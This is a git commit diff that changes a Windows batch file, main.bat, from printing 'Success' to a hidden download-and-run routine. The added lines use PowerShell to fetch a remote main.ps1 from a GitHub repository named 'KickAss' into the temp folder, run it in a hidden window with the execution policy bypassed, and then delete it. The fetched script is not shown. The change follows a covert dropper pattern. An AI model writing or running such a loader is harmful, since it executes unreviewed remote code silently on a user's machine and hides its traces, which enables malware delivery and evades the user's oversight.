35743f2f1265760ff395b6e484d5fd913a6fe8db
madhead341 <106779656+madhead341@users.noreply.github.com>
2025-05-03 17:45:45 +0200

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,2 +1,11 @@
 @echo off
-start cmd /k "title Success && echo Success"
+set TEMP_DIR=%TEMP%
+
+:: Download the .ps1 script to the %TEMP% folder
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/madhead341/KickAss/refs/heads/main/main.ps1', '%TEMP%\script.ps1')"
+
+:: Run the .ps1 script in a hidden window
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\script.ps1"
+
+:: Clean up the script file after execution
+del "%TEMP%\script.ps1"
